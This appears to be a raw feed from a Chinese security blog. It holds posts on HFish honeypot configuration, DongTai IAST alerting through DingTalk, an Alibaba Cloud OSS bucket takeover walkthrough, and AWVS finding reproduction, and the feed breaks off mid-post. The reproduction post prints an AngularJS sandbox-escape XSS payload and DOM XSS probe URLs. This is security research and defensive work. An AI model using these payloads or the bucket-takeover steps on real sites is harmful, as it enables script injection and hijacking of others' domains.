    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这里魔改的HFish指的是三斤大佬维护的版本，现在的版本为闭源免费使用。&lt;/p&gt;
&lt;p&gt;考虑到蜜罐的使用场景，主要为伪装成开放端口、服务和对外的web服务&lt;/p&gt;
&lt;p&gt;经过测试，这个版本的HFish，无法捕获全端口位置扫描，当然可以通过自定义配置端口监听，可实现端口TCP三次握手后的捕获，syn扫描无法捕获&lt;/p&gt;
&lt;p&gt;部署在内网，在我看来，不需要太多的交互，低交互蜜罐就够用了，及时发现内网中的异常行为，我在内网部署了一套OpenCanray低交互蜜罐，这里推荐美团大佬 P师傅 &lt;code&gt;p1r06u3&lt;/code&gt; 的项目&lt;code&gt;https://github.com/p1r06u3/opencanary_web&lt;/code&gt;，提供了web端管理后台&lt;/p&gt;
&lt;p&gt;这篇文章写一下我对web蜜罐的一些想法&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>魔改开源版本HFish - 溯源（JSONP漏洞利用）</title>
    <link href="http://www.pa55w0rd.online/hfish-jsonp/"/>
    <id>http://www.pa55w0rd.online/hfish-jsonp/</id>
    <published>2021-08-19T01:57:06.000Z</published>
    <updated>2021-08-19T05:37:27.983Z</updated>
    
    <content type="html"><![CDATA[<p>公众号链接：<a href="https://mp.weixin.qq.com/s/zkdPcWTFtzrachpqbjLoow">魔改HFish - 溯源（JSONP漏洞利用）</a><br>博客链接：<a href="https://www.pa55w0rd.online/jsonp/">JSONP劫持</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;公众号链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/zkdPcWTFtzrachpqbjLoow&quot;&gt;魔改HFish - 溯源（JSONP漏洞利用）&lt;/a&gt;&lt;br&gt;博客链接：&lt;a href=&quot;https://www.pa55w0rd.onlin</summary>
      
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>HFish插件 - 任意站点，皆可蜜罐</title>
    <link href="http://www.pa55w0rd.online/hfish-plug/"/>
    <id>http://www.pa55w0rd.online/hfish-plug/</id>
    <published>2021-08-19T01:57:00.000Z</published>
    <updated>2021-08-19T06:58:18.066Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转发：<a href="https://www.v2ex.com/t/599168">https://www.v2ex.com/t/599168</a></p></blockquote><h2 id="HFish-插件是什么？"><a href="#HFish-插件是什么？" class="headerlink" title="HFish 插件是什么？"></a>HFish 插件是什么？</h2><blockquote><p>通过插件可以 100% 的让任意 WEB 服务成为蜜罐</p></blockquote><p><code>HFish</code> 插件是基于 <code>Nginx + Lua</code> 进行实现的 <code>任意站点，皆可蜜罐</code> 的牛逼思路！</p><p>目前已经打包好了 <code>Docker</code> 镜像，通过 <code>hfishs/hub</code> 可以快速让任意站点当成自己蜜罐。</p><span id="more"></span><h2 id="有哪些使用场景？"><a href="#有哪些使用场景？" class="headerlink" title="有哪些使用场景？"></a>有哪些使用场景？</h2><blockquote><p>只提供三种使用场景，更多场景自行思考</p></blockquote><p>搭建<code>开源 CMS </code>程序，获取最新的 <code>0Day</code></p><p>快速集成企业内部 WEB 服务，搭建 <code>密网环境</code></p><p>通过一些技术手段，实现主动攻击型 <code>蜜罐</code></p><h2 id="有哪些部署方案？"><a href="#有哪些部署方案？" class="headerlink" title="有哪些部署方案？"></a>有哪些部署方案？</h2><blockquote><p>只提供三种部署方案，更多部署根据实际情况进行搭建</p></blockquote><p>直接 <code>反代域名</code>，让互联网站点成为蜜罐</p><p>通过 <code>域名解析</code> 物理机 WEB 服务，成为蜜罐 (不安全)</p><p>搭建 <code>Docker 集群</code>， 通过 hfishs/hub 插件成为蜜罐 (安全)</p><p>Docker 镜像地址：<a href="https://hub.docker.com/r/hfishs/hub">https://hub.docker.com/r/hfishs/hub</a></p><h2 id="nginx-配置镜像站"><a href="#nginx-配置镜像站" class="headerlink" title="nginx 配置镜像站"></a>nginx 配置镜像站</h2><blockquote><p>因为现在网站大多都做了防盗链机制，这种方式不采用了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 8083;   # WEB 服务的端口，此次拿 8083 端口演示</span><br><span class="line">    server_name localhost;   # 填写自己的域名，测试可以使用 localhost</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass https://hfish.io/;  # 反代的站点，此处使用 HFish 官网 做演示</span><br><span class="line">                </span><br><span class="line">        sub_filter https://hfish.io/ http://localhost:8083/;  # 因为是反代域名 需要替换</span><br><span class="line">        sub_filter_once off;</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host hfish.io;  # 反代站点 Host</span><br><span class="line">        proxy_set_header Referer https://hfish.io;  # 反代站点地址</span><br><span class="line"></span><br><span class="line">        proxy_cache_key &quot;$scheme://$host$request_uri&quot;;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Accept-Encoding &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        # 以下内容 不可删除</span><br><span class="line">        set $hfish_name &#x27;HFish 蜜罐&#x27;;  # 插件名称 </span><br><span class="line">        set $hfish_sec_key &#x27;9cbf8a4dcb8e30682b927f352d6559a0&#x27;;  # 接口安全密钥</span><br><span class="line">        set $hfish_api &#x27;http://192.168.65.2:8989/api/v1/post/plug_report&#x27;;    # 插件接口</span><br><span class="line">                </span><br><span class="line">        # HFish 插件核心模块</span><br><span class="line">        access_by_lua_file &#x27;/home/lua/hfish.lua&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;转发：&lt;a href=&quot;https://www.v2ex.com/t/599168&quot;&gt;https://www.v2ex.com/t/599168&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;HFish-插件是什么？&quot;&gt;&lt;a href=&quot;#HFish-插件是什么？&quot; class=&quot;headerlink&quot; title=&quot;HFish 插件是什么？&quot;&gt;&lt;/a&gt;HFish 插件是什么？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;通过插件可以 100% 的让任意 WEB 服务成为蜜罐&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;HFish&lt;/code&gt; 插件是基于 &lt;code&gt;Nginx + Lua&lt;/code&gt; 进行实现的 &lt;code&gt;任意站点，皆可蜜罐&lt;/code&gt; 的牛逼思路！&lt;/p&gt;
&lt;p&gt;目前已经打包好了 &lt;code&gt;Docker&lt;/code&gt; 镜像，通过 &lt;code&gt;hfishs/hub&lt;/code&gt; 可以快速让任意站点当成自己蜜罐。&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>洞态IAST 钉钉自动化告警闭环</title>
    <link href="http://www.pa55w0rd.online/iast-dingding/"/>
    <id>http://www.pa55w0rd.online/iast-dingding/</id>
    <published>2021-08-12T05:42:06.000Z</published>
    <updated>2021-08-12T06:51:01.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>洞态IAST上线有一段时间了，基于被动式IAST技术，高检出率和低误报率等特点，很好的集成到devops流程中，增加我们的效率，然而每次发现漏洞后没有及时查看导致漏洞处理上的滞后，这里通过钉钉群里机器人做自动化告警，使IAST使用上闭环起来</p><span id="more"></span><h2 id="钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）"><a href="#钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）" class="headerlink" title="钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）"></a>钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）</h2><p>群里机器人文档：<a href="https://developers.dingtalk.com/document/robots/custom-robot-access">https://developers.dingtalk.com/document/robots/custom-robot-access</a></p><p>介绍了如何接入、消息类型、数据格式和错误代码排查等使用上的问题</p><p>这里获取了钉钉机器人的<strong>webhook</strong>，复制下来，在安全设置中，添加<strong>关键词</strong>用来接收告警</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webhook = https:<span class="regexp">//</span>oapi.dingtalk.com<span class="regexp">/robot/</span>send?access_token=xxx</span><br><span class="line">关键词：IAST</span><br></pre></td></tr></table></figure><h2 id="洞态IAST接入钉钉机器人"><a href="#洞态IAST接入钉钉机器人" class="headerlink" title="洞态IAST接入钉钉机器人"></a>洞态IAST接入钉钉机器人</h2><p>通过洞态服务架构了解，DongTai-engine 服务是用来漏洞检测的，根据调用方法数据和污点跟踪算法分析HTTP/HTTPS/RPC请求中是否存在漏洞，通过代码发现火线团队已经在代码中预留了发送漏洞告警的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DongTai-engine<span class="regexp">/signals/</span>handlers/vul_handler.py  的 send_vul_notify()</span><br></pre></td></tr></table></figure><p>我们接入钉钉告警机器人就放到这个方法里</p><p>这里可以看到，传入了一个vul参数，由<code>handler_vul()</code>调用 <code>send_vul_notify()</code>， 看上面的注释，vul参数的数据格式</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http_url:</span> 漏洞所在url</span><br><span class="line"><span class="symbol">http_uri:</span> 漏洞所在uri</span><br><span class="line"><span class="symbol">context_path:</span> HTTP请求上下文</span><br><span class="line"><span class="symbol">http_method:</span> HTTP请求方法</span><br><span class="line"><span class="symbol">http_scheme:</span> HTTP请求协议</span><br><span class="line"><span class="symbol">http_protocol:</span> HTTP请求协议</span><br><span class="line"><span class="symbol">req_header:</span> HTTP请求头</span><br><span class="line"><span class="symbol">req_data:</span> HTTP请求体</span><br><span class="line"><span class="symbol">res_header:</span> HTTP响应头</span><br><span class="line"><span class="symbol">res_body:</span> HTTP响应体</span><br><span class="line"><span class="symbol">vul_type:</span> 漏洞类型</span><br><span class="line"><span class="symbol">vul_level:</span> 漏洞等级</span><br><span class="line"><span class="symbol">full_stack:</span> 漏洞对应的调用链数据</span><br><span class="line"><span class="symbol">top_stack:</span> 漏洞对应污点调用链的链首</span><br><span class="line"><span class="symbol">bottom_stack:</span> 漏洞对应污点调用链的链尾</span><br><span class="line"><span class="symbol">taint_value:</span> 污点值</span><br><span class="line"><span class="symbol">taint_position:</span> 污点所在位置</span><br><span class="line"><span class="symbol">agent_token:</span> Agent的token</span><br><span class="line"><span class="symbol">project:</span> 所在的项目</span><br><span class="line"><span class="symbol">counts:</span> 漏洞出现次数</span><br><span class="line"><span class="symbol">client_ip:</span> 客户端IP</span><br><span class="line"><span class="symbol">username:</span> 漏洞所在用户的用户名</span><br></pre></td></tr></table></figure><p><strong>因为我们只是自己用，就不做交互处理，直接写死到代码中</strong></p><p>钉钉机器人支持@人，这里可以根据不同业务线设置不同告警接收人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新增业务线告警接收人</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">project_vul</span>(<span class="params">vul</span>):</span></span><br><span class="line">    <span class="keyword">if</span> vul.agent.project_name == <span class="string">&quot;project_1&quot;</span> <span class="keyword">or</span> vul.agent.project_name == <span class="string">&quot;project_2&quot;</span>:</span><br><span class="line">        phone = <span class="string">&quot;13111111111&quot;</span></span><br><span class="line">        send_vul_notify(vul, phone)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> vul.agent.project_name == <span class="string">&quot;project_3&quot;</span> <span class="keyword">or</span> vul.agent.project_name == <span class="string">&quot;project_4&quot;</span>:</span><br><span class="line">        phone = <span class="string">&quot;13222222222&quot;</span></span><br><span class="line">        send_vul_notify(vul, phone)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改发动报警方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_vul_notify</span>(<span class="params">vul, phone</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param vul_data:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    dingding = <span class="string">&quot;https://oapi.dingtalk.com/robot/send?access_token=xxx&quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Charset&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    message = &#123;</span><br><span class="line">        <span class="string">&quot;msgtype&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;@&#123;&#125; 洞态IAST告警通知：\n漏洞类型：&#123;&#125;\n危害等级：&#123;&#125;\n漏洞URL：&#123;&#125;\n业务线名称：&#123;&#125;\n探针agent：&#123;&#125;\n请及时处理！！！&quot;</span>.<span class="built_in">format</span>(phone, vul.<span class="built_in">type</span>, vul.level.name_value, vul.url, vul.agent.project_name, vul.agent.token)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;at&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;atMobiles&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(phone)</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;isAtAll&quot;</span>: <span class="literal">False</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp = requests.post(url=dingding, headers=header, data=json.dumps(message))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>然后修改 <code>handler_vul()</code> 方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> vul:</span><br><span class="line">    <span class="comment"># send_vul_notify(vul)</span></span><br><span class="line">    project_vul(vul)</span><br></pre></td></tr></table></figure><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><img src="/iast-dingding/dingding.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;洞态IAST上线有一段时间了，基于被动式IAST技术，高检出率和低误报率等特点，很好的集成到devops流程中，增加我们的效率，然而每次发现漏洞后没有及时查看导致漏洞处理上的滞后，这里通过钉钉群里机器人做自动化告警，使IAST使用上闭环起来&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
    <category term="DevSecOps" scheme="http://www.pa55w0rd.online/tags/DevSecOps/"/>
    
  </entry>
  
  <entry>
    <title>阿里云OSS Bucket 劫持</title>
    <link href="http://www.pa55w0rd.online/oss/"/>
    <id>http://www.pa55w0rd.online/oss/</id>
    <published>2021-07-15T02:25:25.000Z</published>
    <updated>2021-07-15T02:46:12.573Z</updated>
    
    <content type="html"><![CDATA[<h2 id="对象存储OSS"><a href="#对象存储OSS" class="headerlink" title="对象存储OSS"></a>对象存储OSS</h2><p>阿里云对象存储OSS（Object Storage Service）是一款海量、安全、低成本、高可靠的云存储服务，提供99.9999999999%(12个9)的数据持久性，99.995%的数据可用性。多种存储类型供选择，全面优化存储成本。</p><h2 id="劫持利用"><a href="#劫持利用" class="headerlink" title="劫持利用"></a>劫持利用</h2><p>访问某域名，提示 NoSuchBucket </p><span id="more"></span><img src="/oss/oss1.png" class="" title="描述"><p>获取信息，这个桶不存在</p><p>HostId : <code>baobao-tb.oss-cn-shenzhen.aliyuncs.com</code></p><p>BucketName : <code>baobao-tb</code></p><p>登陆阿里云，访问(OSS管理控制台)[<a href="https://oss.console.aliyun.com/overview]">https://oss.console.aliyun.com/overview]</a></p><h3 id="创建Bucket"><a href="#创建Bucket" class="headerlink" title="创建Bucket"></a>创建Bucket</h3><p>注意填写Bucket 名称和地域，和上面获取的信息保持一致</p><img src="/oss/oss2.png" class="" title="描述"><p>查看 Bucket 域名，可以看到创建成功</p><img src="/oss/oss3.png" class="" title="描述"><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>访问左侧菜单，选择上传文件，上传HTML文件，文件ACL 选择公共读就可以了</p><img src="/oss/oss4.png" class="" title="描述"><p>访问该该地址，发现已经劫持成功</p><img src="/oss/oss5.png" class="" title="描述"><img src="/oss/oss6.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;对象存储OSS&quot;&gt;&lt;a href=&quot;#对象存储OSS&quot; class=&quot;headerlink&quot; title=&quot;对象存储OSS&quot;&gt;&lt;/a&gt;对象存储OSS&lt;/h2&gt;&lt;p&gt;阿里云对象存储OSS（Object Storage Service）是一款海量、安全、低成本、高可靠的云存储服务，提供99.9999999999%(12个9)的数据持久性，99.995%的数据可用性。多种存储类型供选择，全面优化存储成本。&lt;/p&gt;
&lt;h2 id=&quot;劫持利用&quot;&gt;&lt;a href=&quot;#劫持利用&quot; class=&quot;headerlink&quot; title=&quot;劫持利用&quot;&gt;&lt;/a&gt;劫持利用&lt;/h2&gt;&lt;p&gt;访问某域名，提示 NoSuchBucket &lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>AWVS漏洞复现小记</title>
    <link href="http://www.pa55w0rd.online/awvs-vul/"/>
    <id>http://www.pa55w0rd.online/awvs-vul/</id>
    <published>2021-06-04T05:39:52.000Z</published>
    <updated>2021-06-04T10:02:25.166Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>AWVS作为黑盒测试，主动扫描的比较好用的工具，碰到部分网站扫描结果一堆漏洞，部分漏洞复现比较难，这里找了几个常见的，以往一直忽略的漏洞，详细研究一下，到最后成功复现</p><span id="more"></span><img src="/awvs-vul/1.png" class="" title="描述"><p>其中1、2、4漏洞比较难以复现，大家一般都是当作误报处理，这里记录一下</p><p>因使用汉化版，部分漏洞描述翻译可能存在问题，请忽略</p><h1 id="0x01-AngularJS-客户端模板注入"><a href="#0x01-AngularJS-客户端模板注入" class="headerlink" title="0x01 AngularJS 客户端模板注入"></a>0x01 AngularJS 客户端模板注入</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>此 Web 应用程序容易受到 AngularJS 客户端模板注入漏洞的攻击。当用户输入动态嵌入到使用 AngularJS 客户端模板的页面上时，会发生 AngularJS 客户端模板注入漏洞。通过使用大括号，可能将 AngularJS 表达式注入应用程序正在使用的 AngularJS 客户端模板中。这些表达式将由 AngularJS 在客户端进行求值，当与沙箱转义结合使用时，它们将允许攻击者执行任意 JavaScript 代码。</p><p>发现者 AngularJS 客户端模板注入</p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>攻击者可以注入 AngularJS 表达式，这些表达式将在客户端进行评估。AngularJS 表达式通常并不是很危险，但是当与沙箱转义结合使用时，它们可使攻击者能够执行任意 JavaScript 代码。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>攻击者不可能使用大括号插入 AngularJS 表达式。应用程序需要将用户输入中的大括号视为高度危险，或者完全避免在服务器端反射用户输入。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>URL: <code>https://xx.com/forget_pass.html</code></p><p>Parameter: <code>phone</code></p><p>URL encoded GET 输入 phone 已设置为 1zmvpmtruem5van。此输入已反映在 AngularJS 模板中。</p><p>这里访问URL可以看到，phone内容作为模板，动态生成HTML代码</p><p>访问：<code>https://xx.com/forget_pass.html?phone=13111&#123;&#123;8/2&#125;&#125;11111</code></p><p>执行了运算 8/2 观看页面中手机号变成了<code>13111411111</code>, 这里可以确定存在模板注入，下面来进一步利用一下</p><p>一般都是注入js代码，类似XSS效果弹个窗口</p><p>这里看了下AngularJS版本为1.5.5</p><img src="/awvs-vul/2.png" class="" title="描述"><p>1.5.5版本存在沙箱，需要绕过沙箱，这里从网上找到对应版本绕过沙箱方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a=toString().constructor.prototype;a.charAt=a.trim;$eval(<span class="string">&#x27;a,alert(/xss/),a&#x27;</span>)&#125;&#125;<span class="string">&#x27;);&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>成功复现弹窗</p><img src="/awvs-vul/3.png" class="" title="描述"><h1 id="0x02-DOM型跨站脚本"><a href="#0x02-DOM型跨站脚本" class="headerlink" title="0x02 DOM型跨站脚本"></a>0x02 DOM型跨站脚本</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>此脚本可能容易受到跨站脚本 (XSS) 攻击的攻击。</p><p>跨站脚本（也称为 XSS）是一个漏洞，允许攻击者向其他用户发送恶意代码（通常是 Javascript 的形式）。因为浏览器无法知道脚本是否可信，它将在用户上下文中执行脚本，这样，攻击者就可以访问浏览器保留的任何 cookie 或会话令牌。</p><p>传统的跨站点脚本漏洞发生在服务器端代码上，而基于文档对象模型的跨站点脚本是会影响客户端浏览器中脚本代码的漏洞类型。</p><p>发现者 DOM 型跨站脚本</p><h2 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h2><p>Malicious 用户可以将 JavaScript、VBScript、ActiveX、HTML 或 Flash 注入至易受攻击的应用程序，欺骗用户，以从这些用户处收集数据。攻击者可以窃取会话 cookie 并掌控帐户，以冒充用户，还可能修改用户能够看到的页面内容。</p><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>您的脚本应筛选来自用户输入的元字符。</p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>URL: <code>https://xx.com/</code></p><p>Parameter: <code>window.location</code></p><p>这里访问URL, 确定输出位置<br><code>https://xx.com/?wvstest=javascript:domxssExecutionSink(1,&quot;&#39;\&quot;&gt;&lt;xsstag&gt;()locxss&quot;)#javascript:domxssExecutionSink(1,&quot;&#39;\&quot;&gt;&lt;xsstag&gt;()locxss&quot;)</code></p><img src="/awvs-vul/4.png" class="" title="描述"><p>查看 addFav()，通过window.location.href 获取当前页面的URL，然后写入到html中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addFav</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + <span class="built_in">window</span>.location.href + <span class="string">&#x27;&quot; title=&quot;&#x27;</span> + <span class="built_in">document</span>.title.replace(<span class="regexp">/&lt;|&gt;|&#x27;|&quot;|&amp;/g</span>, <span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">        <span class="string">&#x27;&quot; rel=&quot;sidebar&quot; onclick=&quot;if(UA.indexOf(\&#x27;chrome\&#x27;) != -1)&#123;alert(\&#x27;&#x27;</span> + L[<span class="string">&#x27;chrome_fav_tip&#x27;</span>] +</span><br><span class="line">        <span class="string">&#x27;\&#x27;);return false;&#125;window.external.addFavorite(this.href, this.title);return false;&quot;&gt;&#x27;</span> + t + <span class="string">&#x27;&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后结果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xx.com/?wvstest=javascript:domxssExecutionSink(1,%22%27\%22%3E%3Cxsstag%3E()locxss%22)#javascript:domxssExecutionSink(1,%22&#x27;\%22%3E%3Cxsstag%3E()locxss%22)&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;sidebar&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;if(UA.indexOf(&#x27;chrome&#x27;) != -1)&#123;alert(&#x27;请按快捷键Ctrl+D收藏本页，谢谢&#x27;);return false;&#125;window.external.addFavorite(this.href, this.title);return false;&quot;</span>&gt;</span>收藏本页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因a标签的href属性里面，对字符进行了url编码，没有绕过，这里先研究一下onclick里面的内容，先美化一下代码，这里可以看到判断为chrome浏览器直接退出，其他浏览器点击会添加到收藏，这里还是没有触发XSS</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (UA.indexOf(<span class="string">&#x27;chrome&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">    alert(<span class="string">&#x27;请按快捷键Ctrl+D收藏本页，谢谢&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.external.addFavorite(<span class="built_in">this</span>.href, <span class="built_in">this</span>.title);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>这里想到之前碰到过的XSS，chrome等浏览器会自动把参数进行url编码，这里换成IE内核的，IE浏览器不会自动url编码的</p><p>想到这里，打开IE，禁用XSS筛选器</p><p>访问 <a 